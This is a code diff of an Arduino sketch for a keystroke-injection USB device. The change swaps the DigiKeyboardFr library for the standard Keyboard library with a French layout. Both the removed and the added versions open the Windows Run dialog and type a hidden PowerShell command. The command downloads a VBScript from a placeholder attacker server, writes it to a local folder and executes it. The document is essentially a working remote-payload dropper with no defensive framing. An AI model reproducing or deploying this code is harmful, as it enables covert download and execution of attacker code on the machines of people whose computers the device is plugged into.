@@ -1,13 +1,16 @@
-#include "DigiKeyboardFr.h"
+#include "Keyboard.h"
 
 void setup() {
+  Keyboard.begin(KeyboardLayout_fr_FR);
 }
 
 void loop() {
-  DigiKeyboardFr.sendKeyStroke(0);
-  DigiKeyboardFr.sendKeyStroke(KEY_FR_R,MOD_GUI_LEFT); //Open the Run dialog box
-  DigiKeyboardFr.delay(500);
-  DigiKeyboardFr.print("powershell.exe -windowstyle hidden -command Invoke-WebRequest \"http://<SERVER_IP>:<SERVER_PORT>/s.vbs\" -OutFile \"C:\\temp\\s.vbs\"; wscript \"C:\\temp\\s.vbs\" | Invoke-Expression");
-  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
-  for(;;){}
-}
+    delay(1000);
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.print("r");
+    Keyboard.releaseAll();
+    delay(1000);
+    
+    Keyboard.println("powershell.exe -windowstyle hidden -command Invoke-WebRequest \"http://<SERVER_IP>:<SERVER_PORT>/s.vbs\" -OutFile \"C:\\Users\\Public\\s.vbs\"; wscript \"C:\\Users\\Public\\s.vbs\" | Invoke-Expression");
+    for(;;){}
+  }
